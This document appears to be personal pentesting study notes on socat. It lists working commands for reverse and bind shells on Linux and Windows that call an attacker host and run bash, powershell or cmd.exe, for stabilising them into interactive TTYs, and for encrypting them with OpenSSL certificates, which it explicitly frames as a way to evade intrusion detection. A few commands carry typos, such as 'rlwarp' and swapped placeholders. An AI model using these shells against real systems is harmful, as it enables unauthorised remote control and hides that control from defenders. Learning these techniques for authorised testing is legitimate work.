# Socat

- with socat, there are always two points
- one listening port and a standard input
- socat connects these two together.

## Reverse Shells

- Basic syntax for reverse shell listener: `socat TCP-L:<port> -`
- the resulting shell is unstable, but this will either work on windows or linux.
- On windows it looks like this: `socat TCP:<attacker-host>:<attacker-port> EXEC:powershell.exe,pipes`
- The "pipes" option is used to force powershell (or cmd.exe) to use unix style standard input.
- `this is equivalent command for linux target: `socat TCP:<attacker-host>:<attacker-port> EXEC:"bash -li"`

## Bind Shells
- `socat TCP:<target-host>:<target-ip> -`

## Stablizing the bind shell
- `socat TCP-L:<port> FILE:\`tty\`,raw,echo=0`
- this is equivalent to Cntrl + Z ; `stty raw -echo;fg`
- there is a special command,
  `socat TCP:<attacker-ip>:<attacker-host> EXEC:"bash -li",pty,stderr,setsid,sane,sigint`
- `pty` allocates a pseudo terminal on the target.
- `stderr` ensures that any error messages shown in the shell get displayed
- `sigint` allows us to send any Cntl+C commands through to the sub-process allowing us to kill commands inside the shell
- `setsid` creates a process in the session
- `sane` stablises the terminal and normalizes it.

This is a typical scenario
```
on the attackers machine

socat TCP-L:53 file:`tty`,raw,echo=0

on the right we have a simulation of a compromised target, invoking the socat through a non-interactive netcat shell

sudo rlwarp nc -lnvp 443
socat TCP:<attacker-ip>:53 EXEC:"bash -li",pty,stderr,setsid,sigint,sane

For more verbose settings use -d with socat

```

## Encrypting socat shells

Encrypted shells cannot be spied unless you have the decryption key and the most important thing is you will be able to bypass an IDS (Intrusion Detection System).

First generate a certificate
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

The above command creates a self-signed cert file with 2048 bit RSA key which is self-signed and has a validity period of less than a year.

`cat shell.key shell.crt > shell.pem`

### Reverse shell encryption with SOCAT

Now we can set up our reverse shell listener on the attack box. this sets up an openssl listener with our generated certificates.
`socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 -`

To connect back we use
`socat OPENSSL:<attacker-ip>:<attacker-port>,verify=0 EXEC:/bin/bash`

### Bind Shell encryption with SOCAT

At the target machine

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

At the attackers machine

`socat OPENSSL:<target-ip>:<target-port>,verify=0 -`

The following is the syntax for setting up openssl listener using tty techinque.

`socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0`

And to connect back, we have

`socat openssl:10.10.10.5:53,verify=0 EXEC:”bash -li”,pty,stderr,sigint,setsid,sane`
